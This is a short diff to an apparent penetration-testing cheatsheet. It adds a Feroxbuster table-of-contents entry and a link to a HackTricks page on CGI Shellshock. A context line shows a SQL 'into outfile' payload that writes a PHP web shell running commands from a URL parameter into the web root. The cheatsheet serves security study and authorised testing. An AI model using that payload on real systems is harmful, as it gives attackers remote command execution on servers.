@@ -30,6 +30,7 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
       - [Fast Scan (Big List)](#fast-scan--big-list-)
       - [Slow Scan (Check File Extensions)](#slow-scan--check-file-extensions-)
     + [HTTPS](#https)
+  * [Feroxbuster](#feroxbuster)
   * [SMBCLIENT](#smbclient)
     + [List Shares (As Guest)](#list-shares--as-guest-)
     + [Connect to A Share (As User John)](#connect-to-a-share--as-user-john-)
@@ -850,3 +851,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 ```
 
 ***
+
+
+## Useful links
+HTTP Shellshock vulnerability(CGI): https://book.hacktricks.xyz/pentesting/pentesting-web/cgi
